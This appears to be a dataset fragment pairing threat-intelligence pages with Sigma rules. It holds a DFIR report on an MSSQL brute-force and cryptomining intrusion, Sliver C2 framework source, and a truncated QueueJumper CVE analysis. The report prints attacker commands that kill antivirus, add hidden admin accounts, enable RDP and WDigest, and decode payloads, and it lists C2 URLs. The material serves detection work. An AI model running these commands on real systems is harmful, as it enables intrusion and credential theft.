attempts:\n\n```image\nAlt: Failed Attempts\nDescription: The image displays a series of failed login attempts to a SQL Server, showing usernames and the corresponding reasons for failure. Each entry indicates whether the password did not match or the login could not be found. The usernames include common administrative names like 'sa' and 'admin,' highlighting potential brute force attack attempts.\nTranscription: |\n  sa | Reason: Password did not match that for the login provided. |\n  hbv7 | Reason: Could not find a login matching the name provided. |\n  su | Reason: Could not find a login matching the name provided. |\n  ps | Reason: Could not find a login matching the name provided. |\n  vice | Reason: Could not find a login matching the name provided. |\n  kisadmin | Reason: Could not find a login matching the name provided. |\n  401hk | Reason: Could not find a login matching the name provided. |\n  sysdba | Reason: Could not find a login matching the name provided. |\n  admin | Reason: Password did not match that for the login provided. |\n  uep | Reason: Could not find a login matching the name provided. |\n  bizbox | Reason: Could not find a login matching the name provided. |\n  neterp | Reason: Could not find a login matching the name provided. |\n  unierp | Reason: Could not find a login matching the name provided. |\n  sp | Reason: Could not find a login matching the name provided. |\n  root | Reason: Password did not match that for the login provided. |\n  bwsa | Reason: Could not find a login matching the name provided. |\n```\n\n### Followed by eventual successful logins:\n\n```image\nAlt: Successful Logins\nDescription: The image depicts a table displaying SQL Server audit events. It includes columns such as 'TimeWritten,' 'EventID,' 'EventTypeName,' 'EventCategory,' 'SourceName,' and 'Strings,' showing multiple entries for successful audit events. The entries indicate the timestamps of the events, the event type as 'Success Audit event,' and the source name as 'MSSQL$SQLEXPRESS,' suggesting automated access attempts by the threat actor.\nTranscription: |\n  | TimeWritten      | EventID | EventT | EventTypeName       | EventC | SourceName       | Strings       |\n  | ---------------- | ------- | ------ | ------------------- | ------ | ---------------- | ------------- |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:01 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n```\n\nIt is likely that multiple successful logins were observed due to the automated access script that the threat actor was using.\n\n---\n\n## Execution\n\nIn the next attack stage, the threat actors established a cmd shell via Extended SQL Stored Procedure (`xp_cmdshell`). This process allows you to issue operating system commands directly to the Windows command shell using T-SQL code.\n\n### Example of command execution following a successful authentication to SQL database using `xp_cmdshell`:\n\n```\nEXEC xp_cmdshell 'whoami'\n```\n\nAt a high level, the overall execution events can be depicted in the below diagram:\n\n```image\nAlt: Execution Diagram\nDescription: The image is a flow diagram illustrating the execution events following a successful brute-force attack against a SQL Server. It details the steps from authentication via brute force, the use of the command shell via `xp_cmdshell`, writing various scripts and files to disk, compiling a MOF file, and killing antivirus processes. The diagram includes visual elements like boxes and arrows showing the progression of actions taken by threat actors, such as adding local administrator accounts and setting up a scheduled task for running XMRig CoinMiner.\nTranscription: |\n  START\n    Brute-Force Attack Against SQL Server\n      Successful Authentication via Brute Force Attack\n        Command Shell via xp_cmdshell\n          Writes 1.bat, and bigfile.txt to disk\n            decodes bigfile.txt with certutil into bigfile.exe\n              bigfile.exe used to run 1.bat\n                1.bat performs the following\n                  Adding Local Administrator Accounts\n                  Hiding New Local Admin Accounts\n                  Enables RDP\n                  Enables Widget\n          Writes kit.bat to disk\n            Running XMRig CoinMiner\n              Creating scheduled task for CoinMiner\n      Compiling BMOF file\n        Adding a new class/ MyASEventConsumer in WMI repository\n          EventConsumer (Script or executable to run)\n            Creates persistence\n            Download/executes VBE script\n              - Random Name\n              - Executes every day at 23:00\n          EventFilter (Trigger condition)\n          Binding (Tie together Filter + Consumer)\n    Kills AV Processes\n```\n\nIf we look into the Windows Application logs, specifically, the SQL Server event ID 15457 captures this as an `xp_cmdshell` event. Additionally, the SQL Server audit collection also captures similar events. The first commands executed by the threat actors included using `taskkill` for various anti-virus software.\n\n### Commands to kill AV processes:\n\n```\ntaskkill /f /im egui.exe\ntaskkill /f /im QQPCTray.exe\ntaskkill /f /im SafeDogGuardCenter.exe\ntaskkill /f /im 360safe.exe\ntaskkill /f /im net1895.exe\ntaskkill /f /im ekrn.exe\ntaskkill /f /im 360rp.exe\ntaskkill /f /im QQPCMgr.exe\ntaskkill /f /im SafeDogServerUI.exe\ntaskkill /f /im SafeDogSiteIIS.exe\n```\n\nThe threat actors also favored the execution of batch scripts on the compromised host. They used `xp_cmdshell` to write a batch script (`1.bat`) to disk by redirecting strings to the file using `echo` commands.\n\n```image\nAlt: Batch Script Creation\nDescription: The image displays a table detailing a process execution log from a cybersecurity incident. It includes columns for 'Initiating Process File Name', 'Action Type', 'Initiating Process Command Line', 'Initiating Process Account Name', and 'File Name'. The table shows that 'cmd.exe' initiated a file creation action, specifically creating a batch file named '1.bat'. The command line executed involves various administrative commands, such as adding a user to local groups and modifying registry entries.\nTranscription: |\n  | Initiating Process File Name | Action Type | Initiating Process Command Line| Initiating Process Account Name | File Name |\n  | ---------------------------- | ----------- || ------------------------------- | --------- |\n  | cmd.exe                      | FileCreated | \"cmd.exe\" /c (echo NET USER Admin\\$ !67hC5140Rvg /ADD /expires:never & echo NET LOCALGROUP Administrators /ADD Admin\\$ & REG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v SpecialAccounts\\Userlist /t REG_DWORD /d 0 & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLogonCredential /t REG_DWORD /d 1 /f & echo reg add \"HKLM\\LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo NET LOCALGROUP Administrators /ADD Admin\\$ & echo NET LOCALGROUP Administrators /ADD Admin\\$ > %USERPROFILE%\\AppData\\1.bat | mssql$sqlexpress                | 1.bat     |\n```\n\nA second set of commands was also echoed into a file named `bigfile.txt`. Once complete, `certutil` was used to decode the text and create an executable file.\n\n### Certutil command:\n\n```\ncmd.exe /c certutil -decode %USERPROFILE%\\AppData\\bigfile.txt %USERPROFILE%\\AppData\\bigfile.exe\n```\n\nThis executable was then used in executing the `1.bat` batch file.\n\n### Command to execute batch file:\n\n```\ncmd.exe /c %USERPROFILE%\\AppData\\bigfile.exe -i -c %USERPROFILE%\\AppData\\1.bat\n```\n\nPulling the hash of the file that was written matches what appears to be a privilege escalation tool as seen in the hits from THOR scanner: \nhttps://www.virustotal.com/gui/file/b67dfd4a818d10a017a4d32386cf4cd2a3974636bed04f27e45de6ada86a56d2/community\n\n```image\nAlt: THOR Scanner\nDescription: The image displays a screenshot from the THOR APT Scanner, detailing YARA signature matches for various hacking tools and indicators. It includes specific rules like 'Hacktool_Inject_Incognito' and 'Hacktool_Privilege_Escalation_Jan22_1,' with links to their descriptions and detection information. Detection timestamps and AV detection rates (e.g., 8/67) are also provided, indicating the effectiveness of the rules in identifying malicious activity.\nTranscription: |\n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Inject_Incognito\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Inject_Incognito\n  DESCRIPTION: Detects hacktool incognito\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_inject_incognito\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Incognito_av\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Incognito_av\n  DESCRIPTION: Detects Hacktool Incognito Av\n  REFERENCE: https://www.virustotal.com/en/file/18e64d4c240f6481e7bd542f6c8acc802549d437ec0018e10a3b0b6f675d/analysis/\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 8 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_incognito_av\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: HKTK_Inject_Privilege_Escalation_Jan22_1\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/HKTK_Inject_Privilege_Escalation_Jan22_1\n  DESCRIPTION: Detects a hacktool that seems to provide privilege escalation vectors\n  RULE_AUTHOR: Florian Roth\n  \n  👋 Hey, this seems to be an open-source tool or framework. The author has shared it with the community with the intention to improve overall security. If you are a victim and noticed this tool in a breach, please visit the tool's github page (see above) and tell your story by creating an issue on the issues page: https://github.com/KaLendis/CVE-2022-21882/issues ❤️.\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n```\n\nWe believe this tool may be a variation of NetworkServiceExploit.exe, which attempts to use NetworkService for privilege escalation.\n\n---\n\n## Persistence\n\nThe threat actors wrote a batch script (`1.bat`) that contained commands for establishing persistence on the compromised host. We see the creation of a new account and adding this account to the local administrators group.\n\n### Commands to create and add user:\n```\nNET USER Adminv$ !67hCS14ORVg /ADD /expires:never\nNET LOCALGROUP Administrators /ADD Adminv$\n```\n\nThey also made remote RDP connections possible by changing the `fDenyTSConnections` and `UserAuthentication` values to `0`.\n\n### Commands to enable RDP:\n```\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d \"0\" /f\n```\n\nThe full contents of `1.bat` also included commands to hide the user account by adding it to the registry using \"Special Accounts\".\n\n### Command to hide user account:\n```\nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v Adminv$ /t REG_DWORD /d 0\n```\n\n---\n\n## Credential Access\n\nDuring the initial access, credentials were obtained via a brute-force attack against the exposed MSSQL server. No other credential access was observed during this intrusion, although the threat actors did enable WDigest to make later credential access easier.\n\n---\n\n## Command and Control\n\nWe observed that the domain `mymst007[.]info` is used to download further payloads. The domain was created five years ago. We have seen similar reports that make mention of the same infrastructure. Attacks associated with this domain include the same or similar tactics techniques and procedures (TTPs).\n\n```image\nAlt: Connections\nDescription: The image is a detailed diagram illustrating the connections and communications related to the domain 'mymst007.info'. It includes nodes representing contacted IPs, domains, downloaded files, and URLs, along with specific filenames such as 'CSRSS.exe' and 'weixin.html'. The diagram visually maps out the relationships and interactions between these elements, highlighting the command and control infrastructure associated with the observed cyber attacks.\nTranscription: |\n  - Resolutions\n    - mst.mymst007.info\n    - mst2.mymst007.info\n  - Siblings\n  - Contacted ips\n  - Contacted domains\n  - Communicating files\n  - Downloaded files\n    - weixin.html\n  - Referrer files\n    - 3f14dc75982f1abd67e66623c5c8277b8d109be96b6f8fef92e4c0be7b2c9b1\n    - wrmi-instance-script.txt (1e4fdd4670ddb98286ed18bb3940c812215b2e5bda0886589e397667000391f)\n    - 563d381d5f8c7fecc6bd8e228cdf8beccab81fe5b1cfb29ddc34dc779e70e1\n    - 1c496854a393f70196745be19e47d758d50df22e2ed3c247a2008576105f\n  - Contacted urls\n    - http://mst2.mymst007.info/\n    - http://mst2.mymst007.info:4000/ver\n    - http://mst.mymst007.info/\n    - http://mst.mymst007.info:8080/all.dll.asp\n    - http://mst.mymst007.info/perp2017/home2/pergavr2017/a.exe\n  - CSRSS.exe\n```\n\n---\n\n## Impact\n\nThe impact was concentrated on this one host. We did not see any further activity in this case. The compromised host had XMRig miner installed and running. The miner was also connecting to cryptomining pools such as `minergate[.]com`.\n\n---\n\n## Indicators\n\n### File\n\n```\nWinRing0x64.sys\n0c0195c48b6b8582fa6f6373032118da\nd25340ae8e92a6d29f599fef426a2bc1b5217299\n11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5\n\nex.exe\na7bafac5ed29a68e0fff6eecc3f5bb3f\n4f19b6970e35b3d20f84a91e3af0d82c68096710\n428d06c889b17d5f95f9df952fc13b1cdd8ef520c51e2abff2f9192aa78a4b24\n\nkit.bat\n91931a2b1ae645004023e1b35fe57314\n9f5a7a293c92ef42374cf1471b653ed994446c15\n4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\n\nsmss.exe\ne579cd176b384b38eda6a0c61c51c274\n8a3b31ac12d9ac1a44707b1de75b8870189db83a\nd3c3f529a09203a839b41cd461cc561494b432d810041d71d41a66ee7d285d69\n\nxit\n88fba011db6e5122f4aa2c0343e11275\na2d34aeee2fb7c1ba57a11c03cc33e76f1217548\ncfa12bb31d58d30875b7a20ed05b5c100032b6a18802fbdf3913e70288e11a55\n\nxitmf\n0c8622c4871541e89d0173d5be0db8aa\nb01a88df39857417233d9bd3256f82d0fdcc63f8\nbeda317d74b8f1090e251205064e686d330a0502006a54dc94d528d6bd16c416\n```\n\n### Network\n\n```\nminergate[.]com\nmymst007[.]info\nbj87670@gmail.com\n```\n\n---\n\n## Detections\n\n### Sigma Rules\n\n- Suspicious Commands by SQL Server\n- MOFComp Execution\n- Hiding Local User Accounts\n\n### Yara Rules\n\n```\nrule miner_batch {\n   meta:\n      description = \"file kit.bat\"\n      author = \"TheDFIRReport\"\n      reference = \"https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\"\n      date = \"2022/07/10\"\n      hash1 = \"4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\"\n   strings:\n      $a1 = \"%~dps0\" fullword ascii\n      $a2 = \"set app\" fullword ascii\n      $a3 = \"cd /d \\\"%~dps0\\\"\" fullword ascii\n      $a4 = \"set usr=jood\" fullword ascii\n      $s1 = \"schtasks /run\" fullword ascii\n      $s2 = \"schtasks /delete\" fullword ascii\n      $a5 = \"if \\\"%1\\\"==\\\"-s\\\" (\" fullword ascii\n   condition:\n      uint16(0) == 0xfeff and filesize < 1KB and\n      3 of ($a*) and 1 of ($s*)\n}\n```\n\n---\n\n## MITRE Techniques\n\n```\nT1053.005 - Scheduled Task/Job: Scheduled Task\nT1136.001 - Create Account: Local Account\nT1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription\nT1564.002 - Hide Artifacts: Hidden Users\nT1059.003 - Command and Scripting Interpreter: Windows Command Shell\nT1027.004 - Obfuscated Files or Information: Compile After Delivery\nT1110.001 - Brute Force: Password Guessing\nT1070.004 - Indicator Removal on Host: File Deletion\nT1562.001 – Impair Defenses: Disable or Modify Tools\nT1546.012 - Event Triggered Execution: Image File Execution Options Injection\nT1140 - Deobfuscate/Decode Files or Information\nT1112 - Modify Registry\nT1078 - Valid Accounts\nT1134.001 - Token Impersonation/Theft\n```",
    "sigma_rule": {
      "title": "MSSQL XPCmdshell Option Change",
      "id": "d08dd86f-681e-4a00-a92c-1db218754417",
      "status": "test",
      "description": "Detects when the MSSQL \"xp_cmdshell\" stored procedure setting is changed.\n",
      "references": [
        "https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/",
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "modified": "2024-06-26",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "product": "windows",
        "service": "application"
      },
      "detection": {
        "selection": {
          "Provider_Name|contains": "MSSQL",
          "EventID": 15457,
          "Data|contains": "xp_cmdshell"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate enable/disable of the setting",
        "Note that since the event contain the change for both values. This means that this will trigger on both enable and disable"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\application\\mssqlserver\\win_mssql_xp_cmdshell_change.yml",
    "id": "808"
  },
  {
    "url": "https://github.com/BishopFox/sliver/blob/79f2d48fcdfc2bee4713b78d431ea4b27f733f30/client/command/commands.go#L1231",
    "markdown": "# Sliver Implant Framework\n\n**Copyright (C) 2019 Bishop Fox**\n\nThis program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.\n\nThis program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License along with this program. If not, see <https://www.gnu.org/licenses/>.\n\n---\n\nThis file contains all of the code that binds a given string/flags/etc. to a command implementation function.\n\n## Guidelines when adding a command:\n\n- Try to reuse the same short/long flags for the same parameter, e.g. \"timeout\" flags should always be `-t` and `--timeout` when possible. Try to avoid creating flags that conflict with others even if you're not using the flag, e.g. avoid using `-t` even if your command doesn't have a `--timeout`.\n- Add a long-form help template to `client/help`.\n\n```\npackage command\n\nimport (\n\t\"os\"\n\n\t\"github.com/bishopfox/sliver/client/assets\"\n\t\"github.com/bishopfox/sliver/client/command/alias\"\n\t\"github.com/bishopfox/sliver/client/command/armory\"\n\t\"github.com/bishopfox/sliver/client/command/backdoor\"\n\t\"github.com/bishopfox/sliver/client/command/beacons\"\n\t\"github.com/bishopfox/sliver/client/command/completers\"\n\t\"github.com/bishopfox/sliver/client/command/dllhijack\"\n\t\"github.com/bishopfox/sliver/client/command/environment\"\n\t\"github.com/bishopfox/sliver/client/command/exec\"\n\t\"github.com/bishopfox/sliver/client/command/extensions\"\n\t\"github.com/bishopfox/sliver/client/command/filesystem\"\n\t\"github.com/bishopfox/sliver/client/command/generate\"\n\t\"github.com/bishopfox/sliver/client/command/help\"\n\t\"github.com/bishopfox/sliver/client/command/hosts\"\n\t\"github.com/bishopfox/sliver/client/command/info\"\n\t\"github.com/bishopfox/sliver/client/command/jobs\"\n\t\"github.com/bishopfox/sliver/client/command/kill\"\n\t\"github.com/bishopfox/sliver/client/command/loot\"\n\t\"github.com/bishopfox/sliver/client/command/monitor\"\n\t\"github.com/bishopfox/sliver/client/command/network\"\n\t\"github.com/bishopfox/sliver/client/command/operators\"\n\t\"github.com/bishopfox/sliver/client/command/pivots\"\n\t\"github.com/bishopfox/sliver/client/command/portfwd\"\n\toperator \"github.com/bishopfox/sliver/client/command/prelude-operator\"\n\t\"github.com/bishopfox/sliver/client/command/privilege\"\n\t\"github.com/bishopfox/sliver/client/command/processes\"\n\t\"github.com/bishopfox/sliver/client/command/reaction\"\n\t\"github.com/bishopfox/sliver/client/command/reconfig\"\n\t\"github.com/bishopfox/sliver/client/command/registry\"\n\t\"github.com/bishopfox/sliver/client/command/screenshot\"\n\t\"github.com/bishopfox/sliver/client/command/sessions\"\n\t\"github.com/bishopfox/sliver/client/command/settings\"\n\t\"github.com/bishopfox/sliver/client/command/shell\"\n\tsgn \"github.com/bishopfox/sliver/client/command/shikata-ga-nai\"\n\t\"github.com/bishopfox/sliver/client/command/socks\"\n\t\"github.com/bishopfox/sliver/client/command/tasks\"\n\t\"github.com/bishopfox/sliver/client/command/update\"\n\t\"github.com/bishopfox/sliver/client/command/use\"\n\t\"github.com/bishopfox/sliver/client/command/websites\"\n\t\"github.com/bishopfox/sliver/client/command/wireguard\"\n\t\"github.com/bishopfox/sliver/client/console\"\n\tconsts \"github.com/bishopfox/sliver/client/constants\"\n\t\"github.com/bishopfox/sliver/client/licenses\"\n\t\"github.com/desertbit/grumble\"\n)\n\nconst (\n\tdefaultTimeout = 60\n)\n\n// BindCommands - Bind commands to a App\nfunc BindCommands(con *console.SliverConsoleClient) {\n\n\t// Load Reactions\n\tn, err := reaction.LoadReactions()\n\tif err != nil && !os.IsNotExist(err) {\n\t\tcon.PrintErrorf(\"Failed to load reactions: %s\\n\", err)\n\t} else if n > 0 {\n\t\tcon.PrintInfof(\"Loaded %d reaction(s) from disk\\n\", n)\n\t}\n\n\t// Load Aliases\n\taliasManifests := assets.GetInstalledAliasManifests()\n\tn = 0\n\tfor _, manifest := range aliasManifests {\n\t\t_, err = alias.LoadAlias(manifest, con)\n\t\tif err != nil {\n\t\t\tcon.PrintErrorf(\"Failed to load alias: %s\\n\", err)\n\t\t\tcontinue\n\t\t}\n\t\tn++\n\t}\n\tif 0 < n {\n\t\tif n == 1 {\n\t\t\tcon.PrintInfof(\"Loaded %d alias from disk\\n\", n)\n\t\t} else {\n\t\t\tcon.PrintInfof(\"Loaded %d aliases from disk\\n\", n)\n\t\t}\n\t}\n\n\t// Load Extensions\n\textensionManifests := assets.GetInstalledExtensionManifests()\n\tn = 0\n\tfor _, manifest := range extensionManifests {\n\t\text, err := extensions.LoadExtensionManifest(manifest)\n\t\t// Absorb error in case there's no extensions manifest\n\t\tif err != nil {\n\t\t\tcon.PrintErrorf(\"Failed to load extension: %s\\n\", err)\n\t\t\tcontinue\n\t\t}\n\t\textensions.ExtensionRegisterCommand(ext, con)\n\t\tn++\n\t}\n\tif 0 < n {\n\t\tcon.PrintInfof(\"Loaded %d extension(s) from disk\\n\", n)\n\t}\n\tcon.App.SetPrintHelp(help.HelpCmd(con)) // Responsible for display long-form help templates, etc.\n}\n```",
    "sigma_rule": {
      "title": "Sliver C2 Default Service Installation",
      "id": "31c51af6-e7aa-4da7-84d4-8f32cc580af2",
      "status": "test",
      "description": "Detects known malicious service installation that appear in cases in which a Sliver implants execute the PsExec commands",
      "references": [
        "https://github.com/BishopFox/sliver/blob/79f2d48fcdfc2bee4713b78d431ea4b27f733f30/client/command/commands.go#L1231",
        "https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-25",
      "tags": [
        "attack.execution",
        "attack.privilege-escalation",
        "attack.t1543.003",
        "attack.t1569.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection_eid": {
          "Provider_Name": "Service Control Manager",
          "EventID": 7045
        },
        "selection_service_1": {
          "ImagePath|re": "^[a-zA-Z]:\\\\windows\\\\temp\\\\[a-zA-Z0-9]{10}\\.exe"
        },
        "selection_service_2": {
          "ServiceName": [
            "Sliver",
            "Sliver implant"
          ]
        },
        "condition": "selection_eid and 1 of selection_service_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\service_control_manager\\win_system_service_install_sliver.yml",
    "id": "825"
  },
  {
    "url": "https://web.archive.org/web/20230925072707/https://www.randori.com/blog/vulnerability-analysis-queuejumper-cve-2023-21554/",
    "markdown": "## What is QueueJumper (CVE-2023-21554)?\n\nOn April 11, 2023, Microsoft released a patch for an unauthenticated remote code execution (RCE) vulnerability in the Message Queuing (MSMQ) service, an optional Windows component. The vulnerability was assigned CVE-2023-21554. The issue was nicknamed QueueJumper by Check Point Research, one of the credited discoverers. MSMQ can be installed on a wide range of Windows operating systems, including server and desktop variants.\n\nAt the time of this writing, no public information was released that provides specific details about the flaw.\n\n## Key takeaways\n\n- The vulnerability appears to be exploitable remotely without authentication.\n- Randori successfully triggered the vulnerability in a lab environment.\n- No public proof of concept code is published at this time.\n- The vulnerable component is not present by default, but is commonly installed on Windows servers.\n\n## Analysis\n\nMSMQ is not present on default installations of Windows, but is often installed on servers to enable asynchronous communication between applications. It can be installed a multitude of ways, including:\n\n- Automatically as a component in a larger application (Microsoft or otherwise)\n- Optionally as a non-required component of a larger application (Microsoft or otherwise)\n- Explicitly through the Control Panel\n- Manually through PowerShell CLI commands\n\nAfter MSMQ is installed, a Windows Service is created that is set to automatically start the `mqsvc.exe` process with the privileges of the Network Service account.\n\n```image\nAlt: General tab of Windows Service for Message Queuing service\nDescription: The image displays the 'Message Queuing Properties' window for the MSMQ service on a Windows computer. It includes details such as the service name (MSMQ), display name (Message Queuing), a description of the service ('Provides a messaging infrastructure and development tool for creating distributed messaging applications for Windows-based networks'), the path to the executable (C:\\WINDOWS\\system32\\mqsvc.exe), and the startup type set to 'Automatic'. The current service status is indicated as 'Running', with options to start, stop, pause, or resume the service.\nTranscription: |\n  Message Queuing Properties (Local Computer)\n  \n  General    Log On    Recovery    Dependencies\n  \n  Service name:       MSMQ\n  Display name:      Message Queuing\n  Description:       Provides a messaging infrastructure and development tool for creating distributed messaging applications for Windows-based networks and...\n  \n  Path to executable: C:\\WINDOWS\\system32\\mqsvc.exe\n  \n  Startup type:      Automatic\n  \n  Service status:    Running\n  \n                  Start    Stop    Pause    Resume\n  \n  You can specify the start parameters that apply when you start the service from here.\n  \n  Start parameters: \n  \n  [ OK ]    [ Cancel ]    [ Apply ]\n```\n\nUpon launch, this process was observed to bind to several TCP ports:\n\n- 1801\n- 2103\n- 2105\n- 2107\n- 50111\n\nDepending on the sub-components that may be installed, other ports may be in use).\n\nThe flaws related to CVE-2023-21554 are reachable through port 1801, which communicates by using the Message Queuing Binary Protocol, which Microsoft refers to as MQQB.\n\nDuring the parsing of various message types, assumptions in the code can be violated that will cause unexpected memory corruption issues. We are not discussing detailed information about the flaws in an effort to avoid enabling malicious attackers.\n\nWhile we have not proven exploitation at this time, triggering the flaw is trivial and the implementation of the code indicates exploitation is possible given enough effort.\n\n## Detecting the presence of MSMQ\n\nWhen connecting to the MSMQ on port 1801, no data is received. The service must be interrogated by using the MQQB protocol to elicit a response. The first example code that we noticed surface was published on GitHub on April 6. It involves sending a small, non-malicious message and looking for a magic value indicative of MSMQ in the reply.\n\nRandori customers can use the platform to identify MSMQ in their environments by navigating to **Targets > Configure View** and choosing the “Service Name CONTAINS Message Queuing” filter to review any results.\n\n```image\nAlt: Configure View dialog within Randori for MSMQ target\nDescription: The image shows the 'Configure View' dialog within the Randori platform, specifically for filtering targets related to Message Queuing. It displays options for setting filters based on confidence levels, affiliation, and service names. The user can specifically filter for assets where the service name contains 'Message Queuing,' indicating how to identify MSMQ in the environment.\nTranscription: |\n  Configure View\n  Asset Type: Not Saved\n  Targets\n  \n  Filters    NVD Filters    Sorts\n  \n  AND    OR\n  Confidence: medium or high\n  Affiliation: not specified\n  \n  Service Name: contains Message Queuing\n  \n  - is not\n  - contains\n  - Message Queuing\n  - does not contain\n  \n  [Done]\n```\n\n```image\nAlt: Attacker's Perspective view within Randori for the MSMQ target with high attackability temptation rating\nDescription: The image displays a user interface from the Randori platform, specifically focusing on the 'Attacker's Perspective' for the Microsoft Message Queuing (MSMQ) service. It outlines various attributes related to attackability, including 'Applicability', 'Criticality', 'Enumerability', 'Research Potential', and 'Post Exploit Potential'. Each attribute is rated visually, with the 'Temptation' level marked as 'High'. The overall design presents a structured layout with sections for an overview and target description, contributing valuable technical information for assessing the MSMQ service in a cybersecurity context.\nTranscription: |\n  TARGET\n  Microsoft, Message Queuing Service\n  802217f5-7adb-4ace-8b93-9f6b0c7228\n  \n  - Attacker's Perspective\n  \n    - Overview\n  \n    - Target Description\n      Microsoft Message Queuing is a communications service that provides asynchronous and reliable message passing between distributed applications.\n  \n    - Attackability\n      Temptation High ↑\n      \n      - Applicability: Level of adoption.\n      \n      - Criticality: Importance of system.\n      \n      - Enumerability: Presence of instances.\n      \n      - Exploitability: Susceptibility to attacks.\n      \n      - Research Potential: Ease of development.\n      \n      - Post Exploit Potential: Potential for further compromise.\n```\n\n## Applications that use MSMQ\n\nSince MSMQ is used for communication between applications, it is often leveraged by both Microsoft and third-party products.\n\nAs Check Point Research mentioned on their blog post, the Microsoft Exchange installer presents an option to automatically include required features that deploy MSMQ. A brief search turns up a number of other vendors that mention MSMQ as a prerequisite, including but not limited to:\n\n- Citrix\n- ManageEngine\n- SAP\n- SolarWinds\n- Sophos\n- Trend Micro\n- Veritas\n\n## Indicators of attack and compromise\n\nThere are a number of artifacts that can be observed when interacting with MSMQ.\n\nWhen probing for the presence of the service, the following artifacts were observed on the target system.\n\n```image\nAlt: Message Queuing artifacts listed in local file directory\nDescription: The image displays a screenshot of the Computer Management interface in Windows, specifically the section related to Message Queuing (MSMQ). It shows the hierarchy of services under 'Storage', including 'Outgoing Queues', 'Private Queues', and various types of messages such as 'Queue messages', 'Journal messages', and 'Dead-letter messages'. This visual representation is relevant for understanding the structure and components of MSMQ, particularly in the context of identifying indicators of attack or compromise.\nTranscription: |\n  Computer Management\n  \n  File   Action   View   Help\n  \n  Computer Management (Local)\n      System Tools\n          Task Scheduler\n          Event Viewer\n          Shared Folders\n          Local Users and Groups\n          Performance\n          Device Manager\n      Storage\n          Disk Management\n      Services and Applications\n          Services\n          WMI Control\n      Message Queuing\n          Outgoing Queues\n              DIRECT=OS:B\\private$\\AD\n                  Queue messages\n          Private Queues\n              System Queues\n                  Journal messages\n                  Dead-letter messages\n                  Transactional dead-letter messages\n```\n\nAdditionally, MSMQ maintains a storage directory) (commonly at `C:\\windows\\system32\\MSMQ\\storage`) that can contain artifacts including messages, log files, and metadata.\n\nThere are specific artifacts that are only created when the vulnerable code is triggered and a fault occurs. In a lab environment with no other dependent services installed, when the MSMQ crashes it will only start back up one time, as demonstrated in the following property pane screen capture.\n\n```image\nAlt: Recovery tab of Windows Service for Message Queuing 